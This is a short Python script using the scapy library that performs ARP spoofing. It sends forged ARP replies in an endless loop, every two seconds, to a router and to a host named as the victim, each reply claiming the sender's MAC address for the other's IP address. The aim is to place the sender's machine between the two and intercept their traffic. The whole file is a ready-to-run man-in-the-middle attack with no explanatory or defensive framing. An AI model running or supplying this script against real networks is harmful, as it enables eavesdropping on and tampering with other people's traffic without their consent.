from scapy.all import ARP,send ,Ether, sendp
import time

arp_to_router =  Ether(dst="80:AF:CA:B8:E8:86") / ARP(
    op=2,
    hwsrc="F4:4E:B4:24:C2:37",
    psrc="192.168.10.42",
    hwdst="80:AF:CA:B8:E8:86",
    pdst="192.168.10.1"

)
arp_to_victim = ARP(
    op=2,
    hwsrc="F4:4E:B4:24:C2:37",
    psrc="192.168.10.1",
    hwdst="F4:4E:B4:54:B4:69",
    pdst="192.168.10.42"

)
while True:
    sendp(arp_to_router,verbose=False)
    sendp(arp_to_victim,verbose=False)
    time.sleep(2)


